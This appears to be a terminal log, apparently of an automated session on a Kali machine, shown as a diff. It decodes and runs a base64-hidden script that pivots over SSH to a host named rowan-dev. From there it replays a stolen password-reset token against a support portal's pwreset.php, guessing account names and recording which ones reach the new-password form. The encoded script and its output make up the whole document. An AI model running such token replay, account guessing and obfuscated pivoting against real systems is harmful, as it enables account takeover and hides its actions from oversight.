@@ -1,0 +1,41 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r10.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKVE9LRU49azE3LXRhbGlhLW1vcm5hYy1yZXZpZXctdG9rZW4tMjg0MQpmb3IgVSBpbiAidGFsaWEubW9ybmFjIiAidGFsaWEubW9ybmFjQGtlcGxlcm9wcy50ZXN0IiAidGFsaWEubW9ybmFjLXJldmlld0BrZXBsZXJvcHMudGVzdCIgInRhbGlhLm1vcm5hYy1yZXZpZXciICJ0YWxpYSIgInJldmlld2VyIiAidGFsaWEubW9ybmFjLXJldmlld0BzdXBwb3J0LmtlcGxlcm9wcy50ZXN0IjsgZG8KIEo9L3RtcC9jXyRSQU5ET00udHh0OyBybSAtZiAkSgogY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1jICRKIC1iICRKICIkQi9zY3AvcHdyZXNldC5waHA/dG9rZW49JFRPS0VOIiAtbyAvdG1wL3gxLmh0bWwKIFQ9JChncmVwIC1vRSAnbmFtZT0iX19DU1JGVG9rZW5fXyIgdmFsdWU9IlteIl0rIicgL3RtcC94MS5odG1sIHwgc2VkIC1FICdzLy4qdmFsdWU9IihbXiJdKykiLiovXDEvJykKIGNvZGU9JChjdXJsIC1zUyAtbSAxMCAtLWNhY2VydCAkQ0EgLWIgJEogLWMgJEogLVggUE9TVCAiJEIvc2NwL3B3cmVzZXQucGhwIiBcCiAgIC0tZGF0YS11cmxlbmNvZGUgIl9fQ1NSRlRva2VuX189JFQiIC0tZGF0YS11cmxlbmNvZGUgImRvPW5ld3Bhc3N3ZCIgLS1kYXRhLXVybGVuY29kZSAidG9rZW49JFRPS0VOIiBcCiAgIC0tZGF0YS11cmxlbmNvZGUgInVzZXJpZD0kVSIgLS1kYXRhLXVybGVuY29kZSAic3VibWl0PUxvZ2luIiAtbyAvdG1wL3gyLmh0bWwgLXcgJyV7aHR0cF9jb2RlfScpCiBwd2luPSQoZ3JlcCAtYyAndHlwZT0icGFzc3dvcmQiJyAvdG1wL3gyLmh0bWwpCiBoMz0kKGdyZXAgLW9FICc8aDM+W148XSonIC90bXAveDIuaHRtbCB8IGhlYWQgLTEpCiBlY2hvICJVU0VSPSRVIGNvZGU9JGNvZGUgcHdkaW5wdXRzPSRwd2luIGgzPSRoMyIKIGdyZXAgLW9FICc8aW5wdXRbXj5dKm5hbWU9IlteIl0qIicgL3RtcC94Mi5odG1sIHwgc2VkIC1FICdzLy4qbmFtZT0iKFteIl0qKSIuKi8gIGZpZWxkOiBcMS8nIHwgc29ydCAtdQpkb25lCklOTkVSCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r10.sh; bash /tmp/r10.sh; echo DONEMARK_1795194815680$((6*7))
+USER=talia.mornac code=302 pwdinputs=0 h3=
+USER=talia.mornac@keplerops.test code=302 pwdinputs=0 h3=
+USER=talia.mornac-review@keplerops.test code=200 pwdinputs=0 h3=<h3>
+  field: __CSRFToken__
+  field: do
+  field: submit
+  field: token
+  field: userid
+USER=talia.mornac-review code=200 pwdinputs=0 h3=<h3>
+  field: __CSRFToken__
+  field: do
+  field: submit
+  field: token
+  field: userid
+USER=talia code=200 pwdinputs=0 h3=<h3>
+  field: __CSRFToken__
+  field: do
+  field: submit
+  field: token
+  field: userid
+USER=reviewer code=200 pwdinputs=0 h3=<h3>
+  field: __CSRFToken__
+  field: do
+  field: submit
+  field: token
+  field: userid
+USER=talia.mornac-review@support.keplerops.test code=200 pwdinputs=0 h3=<h3>
+  field: __CSRFToken__
+  field: do
+  field: submit
+  field: token
+  field: userid
